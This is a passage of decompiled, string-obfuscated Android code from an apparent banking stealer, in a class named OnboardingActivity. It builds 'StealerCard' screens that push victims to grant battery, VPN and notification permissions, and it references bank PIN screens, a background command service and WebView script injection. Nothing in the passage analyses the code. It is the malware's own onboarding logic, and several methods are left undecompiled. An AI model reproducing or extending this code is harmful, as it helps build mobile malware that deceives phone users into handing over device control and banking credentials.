        if (OnboardingConfig.PERM_BATTERY_ENABLED) {
            String strDecode6 = ExceptionsKt.isRu() ? C0000.decode(new byte[]{-79, -84, -77, -121, -75, -70, -26, -113, -79, -114, -77, -128, -76, -113, -26, -121, -80, -76, -77, -128, -75, -73, 22, -25, -48, -30, -45, -23, -26, -24, -122, -26, -31, -30, -42, -24, -36}, "a2c8d867", true) : C0000.decode(new byte[]{123, 87, 23, 68, 7, 23, 73, 23, 126, 17, 76, 11, 93, 13, 31, 81, 77, 95, 12, 94}, "96c0be071a8b0de0", 4);
            String strDecode7 = ExceptionsKt.isRu() ? C0000.decode(new byte[]{-23, -91, -75, -123, -77, -40, -25, -123, -26, -75, -29, -121, -76, -128, -29, -115, -23, -124, -75, -114, 67, -74, -125, -28, -116, -31, -68, 25, -75, -75, -30, -73, -23, -120, -75, -127, -77, -34, -25, -113, -26, -68, -29, -124, -76, -118, -29, -116, 25, -23, -31, -32, -35, -74, -118, -28, -119, -32, -127, -23, -38, -28, -118, 21, -24, -72, -75, -128, -77, -41, -25, -118, -26, -78, -30, -78}, "98e0cf747039d435", false) : C0000.decode(new byte[]{100, 0, 67, 77, 93, 16, 4, 93, 65, 94, 92, 75, 70, 75, 64, 81, 84, 9, 87, 24, 86, 3, 2, 82, 6, 74, 92, 76, 8, 92, 20, 95, 70, 0, 64, 89, 64, 11, 14, 87}, "6e284ba9a839f840", true);
            Function2 function2 = new Function2(this) { // from class: com.base.template.OnboardingActivity$buildCards$1
                public final /* synthetic */ OnboardingActivity this$0;

                /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                {
                    super(2);
                    this.this$0 = this;
                }

                @Override // kotlin.jvm.functions.Function2
                public final Object invoke(Object obj, Object obj2) {
                    int i9 = i8;
                    Unit unit = Unit.INSTANCE;
                    OnboardingActivity onboardingActivity = this.this$0;
                    switch (i9) {
                        case 0:
                            OnboardingActivity.access$drawBellIcon(onboardingActivity, (Canvas) obj, ((Number) obj2).floatValue());
                            break;
                        case 1:
                            Canvas canvas = (Canvas) obj;
                            float fFloatValue = ((Number) obj2).floatValue();
                            int i10 = OnboardingActivity.$r8$clinit;
                            onboardingActivity.getClass();
                            Paint paint = new Paint(1);
                            paint.setColor(-1);
                            Path path = new Path();
                            float f = 0.5f * fFloatValue;
                            path.moveTo(f, 0.1f * fFloatValue);
                            float f2 = 0.15f * fFloatValue;
                            float f3 = 0.25f * fFloatValue;
                            path.lineTo(f2, f3);
                            float f4 = 0.55f * fFloatValue;
                            path.lineTo(f2, f4);
                            float f5 = fFloatValue * 0.75f;
                            float f6 = fFloatValue * 0.35f;
                            float f7 = fFloatValue * 0.88f;
                            path.cubicTo(f2, f5, f6, f7, f, fFloatValue * 0.92f);
                            float f8 = fFloatValue * 0.65f;
                            float f9 = fFloatValue * 0.85f;
                            path.cubicTo(f8, f7, f9, f5, f9, f4);
                            path.lineTo(f9, f3);
                            path.close();
                            canvas.drawPath(path, paint);
                            paint.setColor(-9673729);
                            paint.setStrokeWidth(0.04f * fFloatValue);
                            paint.setStyle(Paint.Style.STROKE);
                            Path path2 = new Path();
                            path2.moveTo(f6, fFloatValue * 0.52f);
                            path2.lineTo(fFloatValue * 0.45f, 0.63f * fFloatValue);
                            path2.lineTo(f8, fFloatValue * 0.38f);
                            canvas.drawPath(path2, paint);
                            break;
                        case 2:
                            OnboardingActivity.access$drawBellIcon(onboardingActivity, (Canvas) obj, ((Number) obj2).floatValue());
                            break;
                        case 3:
                            Canvas canvas2 = (Canvas) obj;
                            float fFloatValue2 = ((Number) obj2).floatValue();
                            int i11 = OnboardingActivity.$r8$clinit;
                            onboardingActivity.getClass();
                            Paint paint2 = new Paint(1);
                            paint2.setColor(-1);
                            float f10 = 0.12f * fFloatValue2;
                            float f11 = 0.22f * fFloatValue2;
                            float f12 = 0.72f * fFloatValue2;
                            float f13 = 0.08f * fFloatValue2;
                            canvas2.drawRoundRect(new RectF(f10, f11, 0.88f * fFloatValue2, f12), f13, f13, paint2);
                            Path path3 = new Path();
                            float f14 = fFloatValue2 * 0.35f;
                            path3.moveTo(f14, f12);
                            path3.lineTo(0.28f * fFloatValue2, f10 + f12);
                            path3.lineTo(fFloatValue2 * 0.52f, f12);
                            path3.close();
                            canvas2.drawPath(path3, paint2);
                            paint2.setColor(Color.parseColor(C0000.decode(new byte[]{22, 86, 118, 34, 37, 126, 124}, "5b0cf890065953", 0)));
                            float f15 = 0.045f * fFloatValue2;
                            float f16 = (f11 + f12) / 2;
                            canvas2.drawCircle(f14, f16, f15, paint2);
                            canvas2.drawCircle(0.5f * fFloatValue2, f16, f15, paint2);
                            canvas2.drawCircle(fFloatValue2 * 0.65f, f16, f15, paint2);
                            break;
                        default:
                            Canvas canvas3 = (Canvas) obj;
                            float fFloatValue3 = ((Number) obj2).floatValue();
                            int i12 = OnboardingActivity.$r8$clinit;
                            onboardingActivity.getClass();
                            Paint paint3 = new Paint(1);
                            paint3.setColor(-1);
                            float f17 = 0.25f * fFloatValue3;
                            float f18 = 0.18f * fFloatValue3;
                            float f19 = 0.75f * fFloatValue3;
                            float f20 = 0.88f * fFloatValue3;
                            float f21 = 0.06f * fFloatValue3;
                            canvas3.drawRoundRect(new RectF(f17, f18, f19, f20), f21, f21, paint3);
                            float f22 = 2;
                            float f23 = fFloatValue3 / f22;
                            float f24 = f18 / f22;
                            float f25 = f18 + f21;
                            float f26 = f21 / f22;
                            canvas3.drawRoundRect(new RectF(f23 - f24, f18 - (0.07f * fFloatValue3), f23 + f24, f25), f26, f26, paint3);
                            paint3.setColor(Color.parseColor(C0000.decode(new byte[]{69, 1, 1, 35, 14, 86, 116}, "f52f7a68a2c4")));
                            float f27 = f20 - f21;
                            canvas3.drawRoundRect(new RectF(f17 + f21, ((f20 - f18) * 0.35f) + f18, f19 - f21, f27), f26, f26, paint3);
                            Path path4 = new Path();
                            float f28 = fFloatValue3 * 0.52f;
                            path4.moveTo(f28, f25);
                            float f29 = 0.53f * fFloatValue3;
                            path4.lineTo(fFloatValue3 * 0.38f, f29);
                            path4.lineTo(0.48f * fFloatValue3, f29);
                            path4.lineTo(fFloatValue3 * 0.45f, f27);
                            float f30 = 0.62f * fFloatValue3;
                            float f31 = fFloatValue3 * 0.47f;
                            path4.lineTo(f30, f31);
                            path4.lineTo(f28, f31);
                            path4.close();
                            paint3.setColor(-1);
                            canvas3.drawPath(path4, paint3);
                            break;
                    }
                    return unit;
                }
            };
            Function0 function0 = new Function0(this) { // from class: com.base.template.OnboardingActivity$buildCards$2
                public final /* synthetic */ OnboardingActivity this$0;

                /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                {
                    super(0);
                    this.this$0 = this;
                }

                /*  JADX ERROR: JadxRuntimeException in pass: BlockSplitter
                    jadx.core.utils.exceptions.JadxRuntimeException: Unexpected missing predecessor for block: B:35:0x013a
                    */
                @Override // kotlin.jvm.functions.Function0
                public final java.lang.Object invoke() {
                    /*
                        Method dump skipped, instruction units count: 951
                        To view this dump add '--comments-level debug' option
                    */
                    throw new UnsupportedOperationException("Method not decompiled: com.base.template.OnboardingActivity$buildCards$2.invoke():java.lang.Object");
                }
            };
            final int i9 = 9;
            arrayList.add(new StealerCard(C0000.decode(new byte[]{83, 4, 76, 64, 92, 65, 76}, "1e849355"), strDecode6, strDecode7, -12326533, -13043241, function2, function0, new Function0(this) { // from class: com.base.template.OnboardingActivity$buildCards$2
                public final /* synthetic */ OnboardingActivity this$0;

                /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                {
                    super(0);
                    this.this$0 = this;
                }

                /*  JADX ERROR: JadxRuntimeException in pass: BlockSplitter
                    jadx.core.utils.exceptions.JadxRuntimeException: Unexpected missing predecessor for block: B:35:0x013a
                    */
                @Override // kotlin.jvm.functions.Function0
                public final java.lang.Object invoke() {
                    /*
                        Method dump skipped, instruction units count: 951
                        To view this dump add '--comments-level debug' option
                    */
                    throw new UnsupportedOperationException("Method not decompiled: com.base.template.OnboardingActivity$buildCards$2.invoke():java.lang.Object");
                }
            }));
        }
        final int i10 = 2;
        if (OnboardingConfig.PERM_VPN_ENABLED) {
            arrayList.add(new StealerCard(C0000.decode(new byte[]{21, 17, 88}, "ca66343c1e8a0b", 0.0f), ExceptionsKt.isRu() ? C0000.decode(new byte[]{-29, -95, -75, -43, -24, -65, -30, -118, -25, -29, -29, -122, 69, -76, -72, -26, -116, -30, -125, -79, -121, -26, -35, -75, -124, -26, -121, -30, -117, -79, -117, -25, -22}, "36ee96226a", 0.0f) : C0000.decode(new byte[]{39, 9, 13, 11, 1, 6, 65, 88, 10, 86, 68, 101, 22, 9, 23, 0, 7, 17, 92, 94, 11}, "dfcede51e8d5", false), ExceptionsKt.isRu() ? C0000.decode(new byte[]{-32, -83, -78, -126, -31, -68, 19, -76, -30, -32, -78, -28, -128, -23, -45, -23, -120, -29, -120, -76, -17, -31, -115, -28, -114, -23, -47, -23, -114, 19, -29, -38, -77, -113, -32, -128, -32, -125, -78, -126, -31, -67, -30, -30, -77, -124, -32, -119, -32, -127, -77, -74}, "09b9033ec104", 0.0f) : C0000.decode(new byte[]{55, 1, 72, 69, 10, 70, 82, 6, 65, 83, 89, 17, 68, 23, 18, 88, 7, 8, 92, 16, 0, 91, 89, 12, 4, 86, 66, 10, 11, 10}, "ed90c47ba56cddf9", 3), -9673729, -12632674, new Function2(this) { // from class: com.base.template.OnboardingActivity$buildCards$1
                public final /* synthetic */ OnboardingActivity this$0;

                /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                {
                    super(2);
                    this.this$0 = this;
                }

                @Override // kotlin.jvm.functions.Function2
                public final Object invoke(Object obj, Object obj2) {
                    int i11 = i2;
                    Unit unit = Unit.INSTANCE;
                    OnboardingActivity onboardingActivity = this.this$0;
                    switch (i11) {
                        case 0:
                            OnboardingActivity.access$drawBellIcon(onboardingActivity, (Canvas) obj, ((Number) obj2).floatValue());
                            break;
                        case 1:
                            Canvas canvas = (Canvas) obj;
                            float fFloatValue = ((Number) obj2).floatValue();
                            int i12 = OnboardingActivity.$r8$clinit;
                            onboardingActivity.getClass();
                            Paint paint = new Paint(1);
                            paint.setColor(-1);
                            Path path = new Path();
                            float f = 0.5f * fFloatValue;
                            path.moveTo(f, 0.1f * fFloatValue);
                            float f2 = 0.15f * fFloatValue;
                            float f3 = 0.25f * fFloatValue;
                            path.lineTo(f2, f3);
                            float f4 = 0.55f * fFloatValue;
                            path.lineTo(f2, f4);
                            float f5 = fFloatValue * 0.75f;
                            float f6 = fFloatValue * 0.35f;
                            float f7 = fFloatValue * 0.88f;
                            path.cubicTo(f2, f5, f6, f7, f, fFloatValue * 0.92f);
                            float f8 = fFloatValue * 0.65f;
                            float f9 = fFloatValue * 0.85f;
                            path.cubicTo(f8, f7, f9, f5, f9, f4);
                            path.lineTo(f9, f3);
                            path.close();
                            canvas.drawPath(path, paint);
                            paint.setColor(-9673729);
                            paint.setStrokeWidth(0.04f * fFloatValue);
                            paint.setStyle(Paint.Style.STROKE);
                            Path path2 = new Path();
                            path2.moveTo(f6, fFloatValue * 0.52f);
                            path2.lineTo(fFloatValue * 0.45f, 0.63f * fFloatValue);
                            path2.lineTo(f8, fFloatValue * 0.38f);
                            canvas.drawPath(path2, paint);
                            break;
                        case 2:
                            OnboardingActivity.access$drawBellIcon(onboardingActivity, (Canvas) obj, ((Number) obj2).floatValue());
                            break;
                        case 3:
                            Canvas canvas2 = (Canvas) obj;
                            float fFloatValue2 = ((Number) obj2).floatValue();
                            int i13 = OnboardingActivity.$r8$clinit;
                            onboardingActivity.getClass();
                            Paint paint2 = new Paint(1);
                            paint2.setColor(-1);
                            float f10 = 0.12f * fFloatValue2;
                            float f11 = 0.22f * fFloatValue2;
                            float f12 = 0.72f * fFloatValue2;
                            float f13 = 0.08f * fFloatValue2;
                            canvas2.drawRoundRect(new RectF(f10, f11, 0.88f * fFloatValue2, f12), f13, f13, paint2);
                            Path path3 = new Path();
                            float f14 = fFloatValue2 * 0.35f;
                            path3.moveTo(f14, f12);
                            path3.lineTo(0.28f * fFloatValue2, f10 + f12);
                            path3.lineTo(fFloatValue2 * 0.52f, f12);
                            path3.close();
                            canvas2.drawPath(path3, paint2);
                            paint2.setColor(Color.parseColor(C0000.decode(new byte[]{22, 86, 118, 34, 37, 126, 124}, "5b0cf890065953", 0)));
                            float f15 = 0.045f * fFloatValue2;
                            float f16 = (f11 + f12) / 2;
                            canvas2.drawCircle(f14, f16, f15, paint2);
                            canvas2.drawCircle(0.5f * fFloatValue2, f16, f15, paint2);
                            canvas2.drawCircle(fFloatValue2 * 0.65f, f16, f15, paint2);
                            break;
                        default:
                            Canvas canvas3 = (Canvas) obj;
                            float fFloatValue3 = ((Number) obj2).floatValue();
                            int i14 = OnboardingActivity.$r8$clinit;
                            onboardingActivity.getClass();
                            Paint paint3 = new Paint(1);
                            paint3.setColor(-1);
                            float f17 = 0.25f * fFloatValue3;
                            float f18 = 0.18f * fFloatValue3;
                            float f19 = 0.75f * fFloatValue3;
                            float f20 = 0.88f * fFloatValue3;
                            float f21 = 0.06f * fFloatValue3;
                            canvas3.drawRoundRect(new RectF(f17, f18, f19, f20), f21, f21, paint3);
                            float f22 = 2;
                            float f23 = fFloatValue3 / f22;
                            float f24 = f18 / f22;
                            float f25 = f18 + f21;
                            float f26 = f21 / f22;
                            canvas3.drawRoundRect(new RectF(f23 - f24, f18 - (0.07f * fFloatValue3), f23 + f24, f25), f26, f26, paint3);
                            paint3.setColor(Color.parseColor(C0000.decode(new byte[]{69, 1, 1, 35, 14, 86, 116}, "f52f7a68a2c4")));
                            float f27 = f20 - f21;
                            canvas3.drawRoundRect(new RectF(f17 + f21, ((f20 - f18) * 0.35f) + f18, f19 - f21, f27), f26, f26, paint3);
                            Path path4 = new Path();
                            float f28 = fFloatValue3 * 0.52f;
                            path4.moveTo(f28, f25);
                            float f29 = 0.53f * fFloatValue3;
                            path4.lineTo(fFloatValue3 * 0.38f, f29);
                            path4.lineTo(0.48f * fFloatValue3, f29);
                            path4.lineTo(fFloatValue3 * 0.45f, f27);
                            float f30 = 0.62f * fFloatValue3;
                            float f31 = fFloatValue3 * 0.47f;
                            path4.lineTo(f30, f31);
                            path4.lineTo(f28, f31);
                            path4.close();
                            paint3.setColor(-1);
                            canvas3.drawPath(path4, paint3);
                            break;
                    }
                    return unit;
                }
            }, new Function0(this) { // from class: com.base.template.OnboardingActivity$buildCards$2
                public final /* synthetic */ OnboardingActivity this$0;

                /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                {
                    super(0);
                    this.this$0 = this;
                }

                /*  JADX ERROR: JadxRuntimeException in pass: BlockSplitter
                    jadx.core.utils.exceptions.JadxRuntimeException: Unexpected missing predecessor for block: B:35:0x013a
                    */
                @Override // kotlin.jvm.functions.Function0
                public final java.lang.Object invoke() {
                    /*
                        Method dump skipped, instruction units count: 951
                        To view this dump add '--comments-level debug' option
                    */
                    throw new UnsupportedOperationException("Method not decompiled: com.base.template.OnboardingActivity$buildCards$2.invoke():java.lang.Object");
                }
            }, new Function0(this) { // from class: com.base.template.OnboardingActivity$buildCards$2
                public final /* synthetic */ OnboardingActivity this$0;

                /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                {
                    super(0);
                    this.this$0 = this;
                }

                /*  JADX ERROR: JadxRuntimeException in pass: BlockSplitter
                    jadx.core.utils.exceptions.JadxRuntimeException: Unexpected missing predecessor for block: B:35:0x013a
                    */
                @Override // kotlin.jvm.functions.Function0
                public final java.lang.Object invoke() {
                    /*
                        Method dump skipped, instruction units count: 951
                        To view this dump add '--comments-level debug' option
                    */
                    throw new UnsupportedOperationException("Method not decompiled: com.base.template.OnboardingActivity$buildCards$2.invoke():java.lang.Object");
                }
            }));
        }
        if (z2) {
            arrayList.add(new StealerCard(C0000.decode(new byte[]{13, 12, 68, 89, 83, 91, 80, 88, 18, 90, 10, 88, 110, 84, 0, 0, 85, 67, 70}, "cc005239f3e615"), ExceptionsKt.isRu() ? strDecode3 : strDecode2, ExceptionsKt.isRu() ? C0000.decode(new byte[]{-76, -14, -78, -118, -73, -18, 68, -74, -35, -31, -40, -79, -33, -73, -31, -32, -31, -79, -47, -74, -33, -31, -34, -80, -21, 70, -78, -125, -74, -47, -76, -48, -78, -116, -73, -22, -75, -29, 66, -32, -27, -79, -42, -74, -41, -31, -46, -79, -38, -74, -34, -31, -35, -79, -47, -74, -33, -31, -34, -79, -35}, "dfb1fa", 0.0f) : C0000.decode(new byte[]{99, 80, 71, 76, 89, 67, 7, 86, 22, 69, 94, 21, 68, 92, 83, 84, 11, 68, 83, 17, 88, 88, 70, 86, 66, 69, 3, 92, 66, 17, 80, 89, 83, 75, 68, 66}, "156901b261"), -10060054, -9024606, new Function2(this) { // from class: com.base.template.OnboardingActivity$buildCards$1
                public final /* synthetic */ OnboardingActivity this$0;

                /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                {
                    super(2);
                    this.this$0 = this;
                }

                @Override // kotlin.jvm.functions.Function2
                public final Object invoke(Object obj, Object obj2) {
                    int i11 = i10;
                    Unit unit = Unit.INSTANCE;
                    OnboardingActivity onboardingActivity = this.this$0;
                    switch (i11) {
                        case 0:
                            OnboardingActivity.access$drawBellIcon(onboardingActivity, (Canvas) obj, ((Number) obj2).floatValue());
                            break;
                        case 1:
                            Canvas canvas = (Canvas) obj;
                            float fFloatValue = ((Number) obj2).floatValue();
                            int i12 = OnboardingActivity.$r8$clinit;
                            onboardingActivity.getClass();
                            Paint paint = new Paint(1);
                            paint.setColor(-1);
                            Path path = new Path();
                            float f = 0.5f * fFloatValue;
                            path.moveTo(f, 0.1f * fFloatValue);
                            float f2 = 0.15f * fFloatValue;
                            float f3 = 0.25f * fFloatValue;
                            path.lineTo(f2, f3);
                            float f4 = 0.55f * fFloatValue;
                            path.lineTo(f2, f4);
                            float f5 = fFloatValue * 0.75f;
                            float f6 = fFloatValue * 0.35f;
                            float f7 = fFloatValue * 0.88f;
                            path.cubicTo(f2, f5, f6, f7, f, fFloatValue * 0.92f);
                            float f8 = fFloatValue * 0.65f;
                            float f9 = fFloatValue * 0.85f;
                            path.cubicTo(f8, f7, f9, f5, f9, f4);
                            path.lineTo(f9, f3);
                            path.close();
                            canvas.drawPath(path, paint);
                            paint.setColor(-9673729);
                            paint.setStrokeWidth(0.04f * fFloatValue);
                            paint.setStyle(Paint.Style.STROKE);
                            Path path2 = new Path();
                            path2.moveTo(f6, fFloatValue * 0.52f);
                            path2.lineTo(fFloatValue * 0.45f, 0.63f * fFloatValue);
                            path2.lineTo(f8, fFloatValue * 0.38f);
                            canvas.drawPath(path2, paint);
                            break;
                        case 2:
                            OnboardingActivity.access$drawBellIcon(onboardingActivity, (Canvas) obj, ((Number) obj2).floatValue());
                            break;
                        case 3:
                            Canvas canvas2 = (Canvas) obj;
                            float fFloatValue2 = ((Number) obj2).floatValue();
                            int i13 = OnboardingActivity.$r8$clinit;
                            onboardingActivity.getClass();
                            Paint paint2 = new Paint(1);
                            paint2.setColor(-1);
                            float f10 = 0.12f * fFloatValue2;
                            float f11 = 0.22f * fFloatValue2;
                            float f12 = 0.72f * fFloatValue2;
                            float f13 = 0.08f * fFloatValue2;
                            canvas2.drawRoundRect(new RectF(f10, f11, 0.88f * fFloatValue2, f12), f13, f13, paint2);
                            Path path3 = new Path();
                            float f14 = fFloatValue2 * 0.35f;
                            path3.moveTo(f14, f12);
                            path3.lineTo(0.28f * fFloatValue2, f10 + f12);
                            path3.lineTo(fFloatValue2 * 0.52f, f12);
                            path3.close();
                            canvas2.drawPath(path3, paint2);
                            paint2.setColor(Color.parseColor(C0000.decode(new byte[]{22, 86, 118, 34, 37, 126, 124}, "5b0cf890065953", 0)));
                            float f15 = 0.045f * fFloatValue2;
                            float f16 = (f11 + f12) / 2;
                            canvas2.drawCircle(f14, f16, f15, paint2);
                            canvas2.drawCircle(0.5f * fFloatValue2, f16, f15, paint2);
                            canvas2.drawCircle(fFloatValue2 * 0.65f, f16, f15, paint2);
                            break;
                        default:
                            Canvas canvas3 = (Canvas) obj;
                            float fFloatValue3 = ((Number) obj2).floatValue();
                            int i14 = OnboardingActivity.$r8$clinit;
                            onboardingActivity.getClass();
                            Paint paint3 = new Paint(1);
                            paint3.setColor(-1);
                            float f17 = 0.25f * fFloatValue3;
                            float f18 = 0.18f * fFloatValue3;
                            float f19 = 0.75f * fFloatValue3;
                            float f20 = 0.88f * fFloatValue3;
                            float f21 = 0.06f * fFloatValue3;
                            canvas3.drawRoundRect(new RectF(f17, f18, f19, f20), f21, f21, paint3);
                            float f22 = 2;
                            float f23 = fFloatValue3 / f22;
                            float f24 = f18 / f22;
                            float f25 = f18 + f21;
                            float f26 = f21 / f22;
                            canvas3.drawRoundRect(new RectF(f23 - f24, f18 - (0.07f * fFloatValue3), f23 + f24, f25), f26, f26, paint3);
                            paint3.setColor(Color.parseColor(C0000.decode(new byte[]{69, 1, 1, 35, 14, 86, 116}, "f52f7a68a2c4")));
                            float f27 = f20 - f21;
                            canvas3.drawRoundRect(new RectF(f17 + f21, ((f20 - f18) * 0.35f) + f18, f19 - f21, f27), f26, f26, paint3);
                            Path path4 = new Path();
                            float f28 = fFloatValue3 * 0.52f;
                            path4.moveTo(f28, f25);
                            float f29 = 0.53f * fFloatValue3;
                            path4.lineTo(fFloatValue3 * 0.38f, f29);
                            path4.lineTo(0.48f * fFloatValue3, f29);
                            path4.lineTo(fFloatValue3 * 0.45f, f27);
                            float f30 = 0.62f * fFloatValue3;
                            float f31 = fFloatValue3 * 0.47f;
                            path4.lineTo(f30, f31);
                            path4.lineTo(f28, f31);
                            path4.close();
                            paint3.setColor(-1);
                            canvas3.drawPath(path4, paint3);
                            break;
                    }
                    return unit;
                }
            }, new Function0(this) { // from class: com.base.template.OnboardingActivity$buildCards$2
                public final /* synthetic */ OnboardingActivity this$0;

                /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                {
                    super(0);
                    this.this$0 = this;
                }

                /*  JADX ERROR: JadxRuntimeException in pass: BlockSplitter
                    jadx.core.utils.exceptions.JadxRuntimeException: Unexpected missing predecessor for block: B:35:0x013a
                    */
                @Override // kotlin.jvm.functions.Function0
                public final java.lang.Object invoke() {
                    /*
                        Method dump skipped, instruction units count: 951
                        To view this dump add '--comments-level debug' option
                    */
                    throw new UnsupportedOperationException("Method not decompiled: com.base.template.OnboardingActivity$buildCards$2.invoke():java.lang.Object");
                }
            }, new Function0(this) { // from class: com.base.template.OnboardingActivity$buildCards$2
                public final /* synthetic */ OnboardingActivity this$0;

                /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                {
                    super(0);
                    this.this$0 = this;
                }

                /*  JADX ERROR: JadxRuntimeException in pass: BlockSplitter
                    jadx.core.utils.exceptions.JadxRuntimeException: Unexpected missing predecessor for block: B:35:0x013a
                    */
                @Override // kotlin.jvm.functions.Function0
                public final java.lang.Object invoke() {
                    /*
                        Method dump skipped, instruction units count: 951
                        To view this dump add '--comments-level debug' option
                    */
                    throw new UnsupportedOperationException("Method not decompiled: com.base.template.OnboardingActivity$buildCards$2.invoke():java.lang.Object");
                }
            }));
        }
        this.cards = arrayList;
        this.currentIndex = 0;
        skipGranted();
        if (this.cardWebView == null) {
            new Handler(Looper.getMainLooper()).postDelayed(new OnboardingActivity$$ExternalSyntheticLambda5(this, 8), 800L);
        }
        CommandService commandService2 = CommandService.instance;
        Headers.Companion.safeStartService(getApplicationContext(), C0000.decode(new byte[]{45, 45, 119, 42, 113, 107, 115, 126, 44, 36, 106, 54, 100, 120, 101, 99}, "bc5e0977", 0.0f));
    }

    @Override // android.app.Activity
    public final void onRequestPermissionsResult(int i, String[] strArr, int[] iArr) {
        super.onRequestPermissionsResult(i, strArr, iArr);
        if (i == 9988) {
            new Handler(Looper.getMainLooper()).postDelayed(new OnboardingActivity$$ExternalSyntheticLambda5(this, 9), 300L);
        } else if (i == 9990) {
            new Handler(Looper.getMainLooper()).postDelayed(new OnboardingActivity$$ExternalSyntheticLambda5(this, 10), 300L);
        } else {
            if (i != 9991) {
                return;
            }
            new Handler(Looper.getMainLooper()).postDelayed(new OnboardingActivity$$ExternalSyntheticLambda5(this, 11), 300L);
        }
    }

    /* JADX WARN: Type inference failed for: r0v2, types: [java.lang.Object, java.util.List] */
    /* JADX WARN: Type inference failed for: r0v5, types: [kotlin.jvm.functions.Function0, kotlin.jvm.internal.Lambda] */
    /* JADX WARN: Type inference failed for: r1v0, types: [java.lang.Object, java.util.List] */
    @Override // android.app.Activity
    public final void onResume() {
        super.onResume();
        if (!this.advancing && this.currentIndex < this.cards.size() && ((Boolean) ((StealerCard) this.cards.get(this.currentIndex)).checkGranted.invoke()).booleanValue()) {
            new Handler(Looper.getMainLooper()).postDelayed(new OnboardingActivity$$ExternalSyntheticLambda5(this, 0), 400L);
        }
    }

    /* JADX WARN: Type inference failed for: r1v1, types: [java.lang.Object, java.util.List] */
    /* JADX WARN: Type inference failed for: r2v0, types: [java.lang.Object, java.util.List] */
    public final void showNextCard() throws JSONException {
        String strDecode;
        BankPinScreens.BankConfig bankConfig;
        String strReplace$default;
        int color;
        Object next;
        ViewPropertyAnimator viewPropertyAnimatorAnimate;
        ViewPropertyAnimator viewPropertyAnimatorAlpha;
        ViewPropertyAnimator duration;
        ViewPropertyAnimator viewPropertyAnimatorWithEndAction;
        skipGranted();
        int i = this.currentIndex;
        int size = this.cards.size();
        boolean zAreEqual = false;
        String strDecode2 = C0000.decode(new byte[]{70, 70}, "43cede94d7", false);
        String strDecode3 = C0000.decode(new byte[]{81, 91}, "45e0241d7cb5cf", 0.0f);
        if (i < size) {
            final StealerCard stealerCard = (StealerCard) this.cards.get(this.currentIndex);
            WebView webView = this.cardWebView;
            String strDecode4 = C0000.decode(new byte[]{116, 91, 93, 16, 10, 95, 19, 6}, "743dc1fcea14940e", 6);
            String strDecode5 = C0000.decode(new byte[]{-29, -82, -80, -78, -74, -118, -78, -42, -26, -118, -29, -118, -79, -124, -74, -116, -77, -32, -25, -72}, "31a2f4bb64", 1);
            if (webView != null && this.cardWvReady) {
                try {
                    strDecode = getApplicationInfo().loadLabel(getPackageManager()).toString();
                } catch (Exception unused) {
                    strDecode = C0000.decode(new byte[]{114, 22, 20}, "3fd0a7d1627d");
                }
                JSONObject jSONObject = new JSONObject();
                jSONObject.put(C0000.decode(new byte[]{23, 77, 7, 22, 120, 93}, "d9bf1987", true), stealerCard.id);
                jSONObject.put(C0000.decode(new byte[]{0, 19, 71, 45, 81, 11, 93}, "ac7c0f80223db567", true), strDecode);
                jSONObject.put(C0000.decode(new byte[]{17, 89, 68, 93, 81}, "e001468995ff79", false), stealerCard.title);
                jSONObject.put(C0000.decode(new byte[]{22, 17, 84, 69, 89, 18, 9, 1}, "ed610f", true), stealerCard.subtitle);
                String str = OnboardingConfig.LANG;
                if (Intrinsics.areEqual(str, strDecode2)) {
                    zAreEqual = true;
                } else if (!Intrinsics.areEqual(str, strDecode3)) {
                    zAreEqual = Intrinsics.areEqual(Locale.getDefault().getLanguage(), strDecode2);
                }
                if (zAreEqual) {
                    strDecode4 = strDecode5;
                }
                jSONObject.put(C0000.decode(new byte[]{90, 77, 16, 16, 86, 15, 100, 0, 64, 76}, "88dd9a0e", true), strDecode4);
                String strReplace$default2 = StringsKt__StringsJVMKt.replace$default(StringsKt__StringsJVMKt.replace$default(jSONObject.toString(), C0000.decode(new byte[]{104}, "418b5a", true), C0000.decode(new byte[]{100, 104}, "8447d6b7", false)), C0000.decode(new byte[]{67}, "d375b56b1101fe", 6), C0000.decode(new byte[]{63, 22}, "c1bdefb0"));
                WebView webView2 = this.cardWebView;
                if (webView2 != null) {
                    webView2.evaluateJavascript(C0000.decode(new byte[]{65, 13, 11, 78, 38, 5, 16, 83, 74, 30}, "2ed9edb7b90d8d71") + strReplace$default2 + C0000.decode(new byte[]{65, 26}, "f3e670", false), null);
                }
                new Handler(Looper.getMainLooper()).postDelayed(new OnboardingActivity$$ExternalSyntheticLambda11(this, this.currentIndex, 1), stealerCard.id.equals(C0000.decode(new byte[]{68, 10, 75, 77, 104, 91, 10, 76, 8, 82, 89, 84, 81, 17, 8, 13, 90, 22}, "4e8975e8a4070eab", 0.0f)) ? 300L : 4500L);
                return;
            }
            LinearLayout linearLayout = new LinearLayout(this);
            linearLayout.setOrientation(1);
            GradientDrawable gradientDrawable = new GradientDrawable();
            gradientDrawable.setCornerRadius(dp(24));
            gradientDrawable.setColor(-182970344);
            linearLayout.setBackground(gradientDrawable);
            linearLayout.setPadding(dp(20), dp(20), dp(20), dp(20));
            linearLayout.setElevation(dp(16));
            LinearLayout linearLayout2 = new LinearLayout(this);
            linearLayout2.setOrientation(0);
            linearLayout2.setGravity(16);
            int iDp = dp(56);
            linearLayout2.addView(new View(this) { // from class: com.base.template.OnboardingActivity$buildCardView$iconView$1
                /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                {
                    super(this);
                }

                /* JADX WARN: Type inference failed for: r0v1, types: [kotlin.jvm.functions.Function2, kotlin.jvm.internal.Lambda] */
                @Override // android.view.View
                public final void onDraw(Canvas canvas) {
                    super.onDraw(canvas);
                    GradientDrawable.Orientation orientation = GradientDrawable.Orientation.TL_BR;
                    StealerCard stealerCard2 = stealerCard;
                    GradientDrawable gradientDrawable2 = new GradientDrawable(orientation, new int[]{stealerCard2.gradientStart, stealerCard2.gradientEnd});
                    gradientDrawable2.setCornerRadius(getWidth() / 2.0f);
                    gradientDrawable2.setBounds(0, 0, getWidth(), getHeight());
                    gradientDrawable2.draw(canvas);
                    stealerCard2.iconDrawer.invoke(canvas, Float.valueOf(getWidth()));
                }
            }, new LinearLayout.LayoutParams(iDp, iDp));
